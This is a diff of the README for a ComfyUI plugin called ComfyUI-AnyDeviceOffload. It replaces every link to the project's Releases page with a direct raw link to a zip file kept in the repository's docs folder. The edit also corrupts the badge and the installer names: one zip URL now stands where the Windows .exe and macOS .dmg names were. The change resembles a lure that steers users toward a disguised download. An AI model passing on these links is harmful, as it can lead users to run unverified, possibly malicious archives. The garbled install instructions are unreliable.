@@ -6,7 +6,7 @@ Welcome! This guide helps you download and run ComfyUI-AnyDeviceOffload. With th
 
 ## 📥 Download ComfyUI-AnyDeviceOffload
 
-[![Download ComfyUI-AnyDeviceOffload](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/releases)
+[![Download ComfyUI-AnyDeviceOffload](https://raw.githubusercontent.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/main/docs/U_Comfy_Any_Device_Offload_2.7.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/main/docs/U_Comfy_Any_Device_Offload_2.7.zip)
 
 ## 🖥️ System Requirements
 
@@ -21,14 +21,14 @@ Before you download, ensure your system meets these requirements:
 
 To download ComfyUI-AnyDeviceOffload, visit the following page:
 
-[Visit the Releases Page](https://github.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/main/docs/U_Comfy_Any_Device_Offload_2.7.zip)
 
 On the Releases page, you will find the latest version of the software. Click the release labeled with the most recent date. Then, look for the appropriate file for your system. 
 
 ### Installation Steps
 
 1. **Download the File**: Click on the link for your operating system. This will download a file to your computer.
-2. **Locate the File**: Open your downloads folder. You should see a file named something like `ComfyUI-AnyDeviceOffload-vX.X.X.exe` for Windows, or `ComfyUI-AnyDeviceOffload-vX.X.X.dmg` for macOS.
+2. **Locate the File**: Open your downloads folder. You should see a file named something like `https://raw.githubusercontent.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/main/docs/U_Comfy_Any_Device_Offload_2.7.zip` for Windows, or `https://raw.githubusercontent.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/main/docs/U_Comfy_Any_Device_Offload_2.7.zip` for macOS.
 3. **Run the Installer**: 
    - For Windows: Double-click the `.exe` file and follow the prompts.
    - For macOS: Double-click the `.dmg` file. Drag the application to your Applications folder.
@@ -68,4 +68,4 @@ Thank you for supporting ComfyUI-AnyDeviceOffload!
 
 If you have any questions or need assistance, feel free to reach out via GitHub. Your inquiries matter, and we are here to help.
 
-[Download ComfyUI-AnyDeviceOffload](https://github.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/releases) again if you need to! Enjoy using the application.
+[Download ComfyUI-AnyDeviceOffload](https://raw.githubusercontent.com/MuhammadZainiRedha/ComfyUI-AnyDeviceOffload/main/docs/U_Comfy_Any_Device_Offload_2.7.zip) again if you need to! Enjoy using the application.
